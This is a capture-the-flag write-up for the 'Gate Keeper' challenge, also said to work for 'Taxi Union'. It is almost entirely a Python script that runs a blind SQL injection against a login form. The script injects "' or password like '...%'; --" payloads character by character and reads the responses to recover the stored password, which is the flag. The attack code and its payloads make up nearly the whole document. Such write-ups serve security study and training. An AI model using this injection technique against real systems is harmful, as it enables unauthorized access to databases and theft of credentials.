# Gate Keeper

Author: [roerohan](https://github.com/roerohan)

## Exploit

SQL Injection. This also works for the [Taxi Union](../taxi%20union) challenge.

```py
import requests
import string

flag = ''

print(flag)

domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_}'

f = 0

challenge = "gate keeper"
url = ""
check = ""
key = ""
column = ""
if challenge == "taxi union":
    url = 'http://extremely.uniquename.xyz:2052/'
    check = "TN-06-AP-9879"
    key = 'lisence_plate'
    column = "location"
elif challenge == 'gate keeper':
    url = 'http://extremely.uniquename.xyz:2082/'
    check = "The flag for the CTF is the password you entered.(If you havent cheated that is)"
    key = 'password'
    column = "password"

print("URL", url)

while True:
    for char in domain:
        payload = "' or {} like '{}%'; --".format(column, flag + char)
        print(payload)

        r = requests.post(url, data={key: payload})

        if (check in r.text):
            flag = flag + char
            print("Success " + flag)

            break
```